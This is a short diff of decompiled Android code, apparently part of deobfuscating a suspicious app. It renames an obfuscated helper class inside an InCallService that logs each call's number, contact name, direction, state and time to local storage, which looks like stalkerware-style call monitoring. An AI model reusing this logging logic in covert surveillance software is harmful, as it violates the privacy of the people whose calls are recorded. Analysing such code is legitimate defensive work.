@@ -18,7 +18,7 @@ import android.telecom.CallScreeningService;
 import android.telecom.InCallService;
 import linker.resourcer.encoder.SmsCallsStorage;
 import linker.resourcer.encoder.Tools;
-import linker.resourcer.encoder.ffbrxjknfnpfxahr;
+import linker.resourcer.encoder.UtilityHelper;
 
 public class MyInCallService
 extends InCallService {
@@ -57,7 +57,7 @@ extends InCallService {
         } else {
             string2 = "UNKNOWN";
         }
-        object = ffbrxjknfnpfxahr.stateCallString(call.getState());
+        object = UtilityHelper.stateCallString(call.getState());
         SmsCallsStorage.Record(string2 + "|" + (String)object + "|" + string3 + "|" + string4 + "|" + System.currentTimeMillis(), SmsCallsStorage.EntryType.CALL);
         call.registerCallback(new Call.Callback(this, string2, string3, string4){
             final MyInCallService this$0;
@@ -72,9 +72,9 @@ extends InCallService {
             }
 
             public void onStateChanged(Call object, int n) {
-                object = ffbrxjknfnpfxahr.stateCallString(n);
+                object = UtilityHelper.stateCallString(n);
                 if (n == 7 || n == 4 || n == 2) {
-                    SmsCallsStorage.Record(this.val$directionStr + "|" + (String)object + "|" + this.val$callNumber + "|" + this.val$callName + "|" + ffbrxjknfnpfxahr.FullStamp(), SmsCallsStorage.EntryType.CALL);
+                    SmsCallsStorage.Record(this.val$directionStr + "|" + (String)object + "|" + this.val$callNumber + "|" + this.val$callName + "|" + UtilityHelper.FullStamp(), SmsCallsStorage.EntryType.CALL);
                 }
             }
         });
